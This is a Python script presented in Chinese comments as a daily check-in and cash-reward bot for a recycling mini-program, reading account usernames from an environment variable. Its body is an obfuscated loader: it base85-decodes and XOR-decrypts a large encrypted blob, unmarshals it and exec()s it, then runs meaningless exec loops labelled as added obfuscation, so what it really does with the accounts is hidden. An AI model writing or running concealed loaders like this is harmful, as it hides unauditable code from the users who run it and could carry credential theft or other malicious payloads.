#大大鸣版 签到领现金  小程序回收猿
# 环境变量 dadaming_hsyxj= username  多账户#隔开
# -*- coding: utf-8 -*-
import base64
import marshal
import hashlib
import random
import os
import sys

def decrypt(encoded, key):
    """解密并执行代码"""
    try:
        # 验证校验和
        checksum = hashlib.sha256(encoded.encode()).hexdigest()[:16]
        if checksum != "c804e6a242d6f411":
            print("Checksum verification failed")
            return None
            

        encrypted = base64.b85decode(encoded)

        key_bytes = key.encode()
        decrypted = bytes(b ^ key_bytes[idx % len(key_bytes)] for idx, b in enumerate(encrypted))

        code_obj = marshal.loads(decrypted)
        return code_obj
    except Exception as e:
        print("Decryption error:", str(e))
        return None


encrypted_code = "ieW`Hc}h7}QAt5HM{Pw*NpdtnSBp$UF=Et66H6a&4PYTR6-#4RHAp2lD`_7|Ept#qJ9{cdRbwYg8&4l=4PYTR6;ESRHAp2kD{UxE6Ld8}GkFw2U1csnEki_a4P?PJBST$K)kzyaBW%G-6M0ZcGJ6_HF=9hVcS}WYA7M8DdrDkVJ48V>M{7k(Npes~GJ6_HF=9hVcS}WY4QX68c}h7}QAt5H;b}!n;&3!US9owmF=81;bxR;%4Qod=99mph_eeoC>}o|zNpdtnS9t41RcYQ!(Mm;c!eB);c}h7}QAt2GDP|%|6MQy7GItb7mt#Xn+)71nX<<b*c}h4|HAKZV9eN;HEqq@?S9owmLwG?*5<=r|X<_a)c}h7}QAt5HMr$BN4RUEt4Qp~mRC6X<(Mm;c!eB);c}h7}QAt2G%Vi-+8gfuW1bA6WL{~#dcPKXi2U}$XNooOhdueMGZA)cqX&g~DcRe068AYbk>8;V(j_vx=_xjM$z^?3zqT}^!U`gFUS9ov>7-N}06DlzZ9SA5;P)p-q1Ue)~1`Hr2JrOiPS9owmF=9hVcS}ZZX<<e+c}mKDQAt6fM-N0cNd`4RS9owmF=9hVcQ-}JXkkU3cuF}|QAt5HM`}ecNg*_7RW=1vJ7PmZS8HWYNkL^5oX@nr<?5uC_l@1fb9g=l6E&91v4_mrlJmxh^W~$w`K+bix%|b`{rjWc&X$k&xWxRTm*b`7)vx~4joi@C{N~;2#;neQr0c|^&e+lG#hlI7+1=Qn*2kgL(uMe-ocEiv?Z&3B!-M$eq0fn;*ZGyopoja*l*`9YV<iE2oaKPB>hh(C(t^_EpwO(R@%ohgyo&eNpa157)$O3U{H(J2we-i)|K_aH*_Mvau<XI1irJ_2;-kU!kNxS~?bFfu{;ckauk7)x)ArE%?3~Te*YDh|)B2<5|A)w`oaBmlaiG?Lq2=JO^v%=N|B&?G*Z%LX?a!gq(uMe-p5BqL+5WDH%Z|y;ulbmz>i(4dyo=h{lkv-n(%Yh*@*HUex53xY+ry*O*_MvlzuEkuiP)?6>aNP-jQaS{*ZdZ<&H1Fc{f+kCtjxcs-|m;*iHFAfk@(Pu&gG)7{j9pvw9oX>|KP3k(wddcv&7J&qtBqo^+5qEB!udWo$$A@#rUU~<Bs{>p~r)!&HR-9iiZB(p3&8a&fuel{j7!Ax53xY!rh_p-<PD%vF7Zfm*A)H`lIpifz{?4S+Aeex7Xd#{LrEH+?To3v&H?Rx%8*--LL=EfzRR5!SK=f^q}C3pz!Og)AroO&7SP()a~q`^!B6K;DqkEo%D>c+vcRO@r~HXtoog<>-3e)sE7I7lElx6{@1Lv<E^IiwD9-S$orx7(wdIyv%}4;p5vv^`K0;dkLbnI<-_00(xL9Oq4Ue6_5RYy#+=LP)Y8SR>*J&Q--OMDk>s7e{>Z1Jz>og@tm3+)-`JVlm4(>wlFs&r?favt)npl5wetGW`u?Ht?3R!Ev&H43r`x9V_^sN?j{VNl)b7yt=&stEpz*=4^T^W4!Jq5#*X-u5|J|(k-G|GNo%e>Z#o?)%;)3MzuIZYl&HR-9iiZB(pU>Zk_06KM{jP-Rw%zI7$L_4i^p}p+v%}<~isY)$@}uh1kIdoF+WOzl->Sj4O<|+g<(7{7vGMSrzVoK=^sL|OkLbnI<-^~=)~))3qtnQ))!Na`(w_V2)!)Ue&&I6w`Gx<xS);DxxcL1VqVDOh_2tpd;8>UFxQF`tlEn3j=J246`fA_b(X7s-qSMB#)ArKH*PiUm*Yw1!%>AJ9?uGrho$#Kq#nz;`!i~=7t<SQh@AaA7p@#X!SFO?6fz|vPk;IO(+2CQ)>f){R)Rc$RzsK#ZmgcMJ`>*}ghTX}~;_Bb~^{xAop#R#e^U~A%;8&RXtc390pX$kr(c7Y!@UN-Zx7Xd!+U%m=_?C#_vFhEevFD}1_pQv(kLth`o%f}_(afcd%7gLLt;vt2>g|~El7{&6eL<t<>4eIpobtM{%gv;-!j9|mt;w;a>Eo5?mxlW2nD@zu&)}n&+pVqswe!!=!rh_p-<6>0zWC&-jqat&->&-VfWZFH<>KA$+M)c2qWjCN)Aj~+vdI6Vrqrg+@~{5kfzRa9*WKUB>#xb9q2kW1)yUBK`kmg%)aUE1|Ld&w&4vDuo$|A@*UY4w{zakl?3I$hv%=S+rTwPB-mKo`fb#p=#mh4i6$GV<+KkZBpy<1&z|NN5g@o7fk;Bu6$i$$q{H&Dnw9L%i^T?p+`IM~Bu;TQitl_4>-l)axjoHQ1?(E&`?yl9Hq2tr8?f=oq;hf6D)!F#0%HE>%(S*Q;k<O#A&E==P(KseKAOb+B_Q99lpM}}XpX|Yk;rObF^{=tdx$ei&|Iwq#;g^H+vG&!VzV)T$)2_hcfz{^F+WOzl-)CXa;pwBv;g*cdvgrJywe76*`=jdEfXM05!NA<!@u1j|q2k4_^4HVa@16Db*Yw1!%>7SgE(kGQ3@8I!IXyK+G*N0~E*n58A{t&MUJq<>Pksmn2L@_H6(KWracN=K(*LL4*^r^pwe8@ir1GKN=c&;Di}cmk?AqJI!K>7zrT*2a+~U^M$C~BU)A!S=;@hYC`Ge4<o8PIl#Mz^u*NM>EtLLPn!swFFp@7!dmEP5j{PCxt>8Py6v)s|w()*|0*^r^pwe8@ir1GKN=c&;Di}cmk?AqJI!K>7zrT*2a+~U^M$C~BU)A!UuS8HWYi}chLS!x+}acN-{XG>*kX;KtncUVwm5kg~VS8HWYNkL^5S!x+}acN-{XG>*kX^^4NU06_M5rEd&S8HXB|LLcr@u;ufv){?r(c`Dx!BP~X!SIsPxq#KcmEFya|LLcr@oE{g$HAkc&xzB+X;KtnweI+*r|O~J|7&GWNkL^5S!x+}acN-{XNl0-LsArBcbetY5kh0C;lro-;X!2;o7}Oq$H8IO(c`Dx!BP}qweI+*r|M&>;lro-;e*q?o7}N>ajVz8rTxvR-}=_q-&jy(5kg~VS8HWYNkL^5S*WbXTWMhxXNl0-X;KuU!SIsPxk6)TmEFya|LJAd@50-_*=b=FrTxvR-})4z!SIsPxk91d|EbgGi}%gf@4^|h$HAkc&r4-%X;KtncUVwm5kg~VSE<ncV?kvVS*WbXacN=K(c`Dx!BP}qweI+*r|M&>;lro-;X!2;o7}Oq$H8IO(c`Dx!BP~X!SIsPxk6*A;lro-;X!2;S!x+}acN-{XG>*kX^^4NU06_M5rEd&S8HXB|LLcr@u;ufv){?r(c`Dx!BP~X!SIsPxq#KcmEFya|LLcr@oE{g$HAkc&r4-%X;KuU!SIsPxk6)TS8HWYNkL^5S!x+}ajVp%O-p5KX^^4NcUVwm5kg~VS8HWYNkL^5S!x+}acN-{XG>*kX;KtncUVwm5kg~VS8HWYNkONe=s+2EacQHV)=On;X;RVJ$)4o%*6#eT`TMNs_=f0<oWhBAacN-{XG>*kX;KtncUVwm5kh0C;@VG7NkL`T?AsZ3acN<8H4Y>{EEW_aE?AY}mWSu>p7Z8UL_re-S9%v_acN-{XG>*kX;KtncUVxTr1ME=S8HXB{P1NJS!x-+(A}nn{EgG{tj@c8cMeKDUJfEJMRIdoQBiyhS!x+}acN-{XG>*kX;Ktnwe8_g5kg~VmEP1(NkL^5obH~p_3o&R<d6UFugA5f>D-_Bt5b7&LUVRkUsQG#S!x+}acN-{XG>*kX;Ktnwe8_g5kg~VmEPZt{PCxt>8Py6v)s|w()*|0*^r^pwe8@ir1GKN=c&;Di}cmk?AqJI!K>7zrT*2a+~U^M$C~BU)A!S=;@hYC`Ge4<o8PIl#Mz^u*NM>EtLLPn!swFFp@7!dmEP5j{PCxt>8Py6v)s|w()*|0*^r^pwe8@ir1GKN=c&;Di}cmk?AqJI!K>7$O-p5KX<Id$QV0SpUlwXftxYEm2M-`e3QIXwQE9t9dl)e}ARJSFjdTDvSPVB86)GzM3==mzc}h82QAt5YU28>4$#TR)OLln0cb9ocazV{W=q$l_`3Jch(FC$JM{7kWNpdtnS9owmF=9hVbxTEWYGFk+ie@=hQQkp8Mr%b&NpdtnS9oyaF=9jGcS}WYX<<b*c{e#KQ6oS#M{7k(Npdt2S5a{=Ct^cLkl)&g;qk1m_N=As1Ue)~YAPZwCk7ouC46v2F}OuK79}A71V}{hb3aNmBNiZ1A_XxxNOCkmcM5n#F=Cln1u82G1`HZN3NK3uFfJrpGZ{-uNpcuLS9k+aF=9i=cdk@*_<GSU`2gWvM4d`0mv31)Lvl1hG<k4EF=9hVcS}WYX=Ft;c}Y1|QMv;(M{B}M-f~btDtQz~xMDR(1xU<q4P$sU4NEyzQAt5HM{7k(z;cv8S9owmF=9hVcS}WYX<<b*c}h7}_enuD>}y3!NpdtnS9sP$F=FURcS}WYX<<b*1V~*~@k>E9M{7k(NpdtnS9owmF=9hVcT3H04`3lN{X#`l6-nncM{Dj&NpdtnS9owmmt#Xn+)71nX<<b*c}hf8ElNE!J!?fvG<HBnS9owmF=9hVcS|p8X<<b*c}h7}_enuD>}y3!NpdtnS9lFTO=sgxcS}WYX<<b*c}h7}QAt5HM{7k(HFlIoS9owmF=9hVcS}WYX<<b*c}h7}HB9F;M{Dj%NpdtnS9owmmt#Xn+)71nX<<b*c}h4|EllAuM{7k(NpdtnS9owmF=9hVcS}WY&tXM1(n>j2QAt5HM{5>KV03z$T`d4LMms1jH772$Z4xX}7qB>RGDtx+M{7k(NpdtnSAK9sF>ymkcernFX<^Vb?n+)(ElC_YI%+ve(sEEi-g*o~C}KlMcS}WYX<^<q<VmPh-B}VfZfd_ublWs&RHAZg0k}dVtxYu!8vrOq3Q0LuQE6edHDg6fNr*muI}rmhQVlLRNik;(2n{Ac6)R0M4mv1ODMfiFCJ|LFBt~9&T?;Tg6eK7gS6xLlc{vhRQAxSAN4r@LnQn2BOFh5@kz<opSesZt$tUdu-2>@Mewkbvmv;c0RX5~a5(;`nF=9DQ0zV@{QAkbie>qkpB`hWHLjWK$I;b!!I1wJ7HVPs;A15pgvtlSwOpre#AuS+5BC$g*ClOmEGNO4cR2nBC5H2<wKxa2Cc}h8qS2`qCH4ZV6LIGPdBOMePS_e8itw%H(3==$R3O-9eKQ5a+Gy)<e76CvrC1!9%F%d;bcS|KtNkL^53qm<oQIk(rCI==yB@;j-2n!h^Ul3(TcT0C~X<;_2c}h91(Mh2=Uh4z9PjWm@$8MlPCbC3duSZw^U+D|Le@ZG($zR?s-EiDi)o<lfaI9itu_>EdVcdQFQL$NYsaAZ3O$?DK0@GfbRX62b60B?h;Bf_<WDUh5nP){MWzt`VUTwjBvTa2`TmB!&dh}hza=J%P@Bzmq;Tg(G^EII%fJSEFNKBMZVWu!?hkRI_I&92!{dUYy<zAIBV>mNbQAwLSBMKoZBpX^L2oM82NeH<~R6bB|X<?v|-mjhUxbfo9$oiti`INTlvE=zMBVt2Hlk@M2^8cfu&#krTx&7zR$lNe-Npdu#^WT->mW%uAlEl=A=h36L(X5O2x7Enp!sep(=astdvfA^YzWS=q_-1<x2n8fq5F}m+IXXB^EeJ$QNpdtnS9owmF=9?gcS}ZZX<@d3dP+ILQ7u4GMGr<VO%^ddR~&XBHvU94c0WXKX<<b*c}h7}Q8hr7Mr%b&NpdtnS9owmF=9hVcS}WYX~#u1dEq%$QAt5HM{7mxNOCmlR(NnlF=9hVcQ-@}VO>Qvc`h(3Q!PtTOb<yvOmZ|qS9owmF=9jRcS}XYX<<b*c}h7}Q7ueSNe@adSr#QFMI2)xB?ea1dp1U9X%#{>c}h7}QAt5HM*%@gNpdtnS9owaGaf)RcIQ*cYGFm5dP+G~QAt5HM;1XhP0}$zS9owmF=9hVcS}WYX<<b*c}h9(QAt6bM{7k(NpdtnR|R!3JYqvgcS}WYX<<cCZay|vQAt5HM{7k(Nf<mqS9owmF=9jRcS}XYX<<b*c}h7}QRzrEM{7k(NpdtnS9owmF=9hVcS}VJamPe8dEq!#QAt5HM{7mUN$)o2R(NpkFk(YUcS}WYX<$W3eCj<`QAt5HM{7k(NpdtnS9owmF=9h3ZtX;GY05-3c}h7}QAt5jT>wW*NpdtZ`2=<4HDW_ZcS}WYX<<b*c}h7}QAt5HM-N^iNz^t$SJQGuF=9hVcS}XjZDB<<c}h7}QAt5HM{7k(NpdtnR~&31EW|-bci=~FX<<b*c}h7eS2aYHLu*A#NpdtnS9owmF=9hVcS}WYX$4+fdF(q@QQ|{2M{7k(NpdvdQ+RMiF=9hVcS}WYX<<b*c}h7}Q7vClTFpmGN!d0*S9owmF=9hCa5q5DZDB<<c}h7}QAt5HM{7k(NpdtnR~&0BF~mVgci=~FX<<b*c}h9<RY^fLM{7k(NpdtnS9owmF=9hVcQ0BCbjL?EdEq-&QAt5HM{7kkK?XTNS9owmF=9hVcQ0iVY5GM`ST;Y+Q7vPrLd`@=N!c|)S9owmF=9hWcQ-;Ee-%hIc}h7}QAt5HM-OH<LFqIla|CzZF$Q7Pa_vNKY05-3c}h7}QAt5GM-N{ZNd`GVS9owmF=9hVcQ0iVY5GM`TsA!RRY^fLM{7k(NpdtnS9owmF=9hVcQ0cLPRB<zdEq-&QAt5HM{7mUN$)V{R(NpkFk(YUcS}WYX<$WBQ5iXPQ9V^PM{7k(NpdtnS6py693M(NdP_xbX<<b*c}h7laWz4%M-Oa2UUD=+S9owmF=9hBe(gkWY05-3c}h7}QAt6rNA^MONOCmlR(NnlF=9hVcS=PzX$3_{a5OM7c^W}cM;1&qKm|26R{(PyF%?2#T?L<O91<W$qfb#KC_XvwS6X#^a1>T^V@*hQ2nTe2LXkvWvt~407$jXcK9fKJZfu`TC=oy?I2Ni#P!cneaVj+*0t7toawl9QG9e&aGc+tOlXO`mBM=`U>uNST5;-dl1O%Tl4=+n4I3_PgR%=B|Ggn+SBM1Y39!)eq0A+Ap3ky6O8YNVDFgYk1CL1+mApuQqClCNXI|(K&2WBJ#02d(dczfegB`h*QJ$ocOIUZdiHVhdmUri}H7$rY!Lr!l`b16$XB06kFE*~I~O%Yo&B%*a7ToN}i4GS$B9T7GUR%J>vBR?osA{-znArnAvG#4FeMj9e46LWD_T~H@cN_$vfXMAo1cV22cC>2p`F$xhVR7@*88Ye$~4jU{*Rcc)`HzgoJB1dH@I|w>EKUFge9T+Qf26lBpP)JGda|u>BKP)0aE(9x)K?*}8H75uyL%2>289fF72M-`t4I@@KD?=1UA{l53E*DxgEp#&~Ult}N17;Bx83dm*I4N2)Aw4@g6b>e44;MfpKUE_vMF%-XBrYaGF9b1G5odHcH7q+j6b>e44;MfpKUFj!LKc}%B`zZh8w58`b_-fHG&waG0tF@{EgM=UEq5^{QU^0US_dQn4iqF(9Ai6-Rv{!*BMvt>J8CpRR}FqeF=C|U$*#@ckM{H2?*0RID_CS~YECF-Y!(z`A3{|K3r7%=eIhn68Wbj0963q?i%lg|GYX$ZI2%<jGZ`NmP!%FN6FEn3X<?r^9VJXOJuDtnFbX#>lVeaWA{rbZZUZza1uq&42pBd%eo8r3x&7zR$lPT<QF1gvZCID+kB7_nk;B!B<Njn7k;IO(@7{YAGH69hNtdz0B6M&?F^c@wknre;#NVL3$v-VtQAwnc?u7ZrpwOwL^X{0-hKK#%O=~cJX<<bVS*?`lw88Pv<JztN>_`-wP!$z6LIWf%0!Kw}X@}XLp4FVc#n7pm=q)f?NpduMcc0z+)avuC%gLbE(OYF4bvPeZQAwLIBm^}wJA5=jSE6_~R1-EW1V1*lY6c)dqfS#LJ|{CXM{7knN^&$oje8y{Mz~8m134ob01P1Sa1TK>G&wa~C<UKLItE5)T?$1-F=8=LcS}XJY7{qF3ko?_QIknWA{aF!Cjn8LQ3@3{L=HESaw;+o8wEFUc}h8qS}iU>B?llBEfY;Ljd>L|J7PmfS8HWYNkL^5S!zpOQAt5ZR%=B|J7Y9KS2l1(F%e`+cT2@@nP){NV3IaKiCbmuP;s4EQmP<bk85VNK59))hf7UiZ{Y*LZ%Qw6@ek&H<sjq+?LXyIWvpd)u_ViW_64P7Sm6f6e@ZTOiCtFhUUZmUZlfY-gKk-!DM*`IV3S`-v3q6hV{73>1d&=BpKxxwP=7l|r+9rzH{t}iX<k5jv~pgdMd~{K2Jsi=R4<fR4W=gr-*Bi@DD__2YT8=+cIiXVaYyM`9Mn0fJMuf%H>E3gg=a>U1}KtOJfB)5xo-&NcL(TRADu~imtza7LSwso-9q3g;Avo-d}!qxyJ~Lba$(^@OWq5o4f8YWJEI_LgKS!oB}|cAS>rmdXs}UttzLWH6p>mK*iqkc=@gtJhGRjIDpQnGLYZD#*$;(Os8Ml(N&(4vpK)c>W9S~?0nj3pD^izIN1R_<yL)lvOak$DfKv_OT_?=|tbQetMKI_M;cyF>Wdr>RxpNKWYXa#+8JJCclV=Q@MLX<HOo(tqJUc>_XI_<gKEWR4Zyo7C28k`@Q9PAh9-<-^hG-~}Av%*-FOyby`Bk7fXqqbv$pMik8oO5(`4odI<r1)5`7DxtET3~UxpNrhYZvHR51mbGmuDN3T56<pubq2Q!D2y8V!K6cY;?6XdrvHjSwxXLee+G5M@ZyPZOv2lP}61nQJYIuxo>~uadGWlYMDt6pJY+PJo-V&BJc&xM4G#>kGnu^Y;?WNfjK5tQAvO}15E>KNw)!L5m<185oiQobd7IKE^|imYfpYbQj<w)7zQLFCoOAeL!x&YZU!tXC=@p*X<<c2GfFvDi%Tv>ooP2NJ8v{WR|<1QF=ClU5h^YUHWW5c3oBkTKRq)sM{7knKyoxeC3bK{F%V@)cT1mW3=cD03nf>KR5~$PE+3ymC=pjKA{GQTLu5lpcacT|3=cOXc}h8qSr#5!CI%oB7N|2IG#ei<UluW4cS}VbV_`)#3qm<oQL{-2Dg+@uB^L@aH+XPGFk(YU1Oh~FX^}=WcuV0{YMDU}r)x^fM)EtsSfFrDv1!9Y_duO*VBt))aLO=_Q9!{w$701ok#ai0S@?d%Ke|Izr%PDBX?&G6WSTikfk|BLM^BYYZK5<~hj>(#F-DU}Q@cZPXmhnSXG<%lQCC1Gw<|<QNN>bJRC#T+F=0Ygheua#a*;(Rcu~n#Lr7Z1ZEHba*#MwBhkH?#GDDk3V8b`#5&1@~E7oI%d2y8}e!5C=oqZ0$AE0zhu_u#4H0x&1O2I9ZRPGdpTMCgs1iMcNn09cLQ#_zSb+Shcmqb+WA-O?3`48z_7nntIlWzi>O*O<tVtHk?F;_xehf8p7e32_Oc}_LnE1N<rmuOs*O=7eS);9DDu`HWgY`aBnY<IOacuz0hR*^|L&u`5fz<;<*-*xy%!DT~CZJS1RnPo&UZ@M{GR9`bcM{7j"

key = "iaE5yJ9VQIA5GkEKIr4AWxpE1bCHwKEo"


code_obj = decrypt(encrypted_code, key)
if code_obj:
    exec(code_obj)
else:
    print("Decryption failed")

# 添加混淆代码
for i in range(100):
    var_name = f"_var_{i}"
    exec(f"{var_name} = os.urandom(32)")
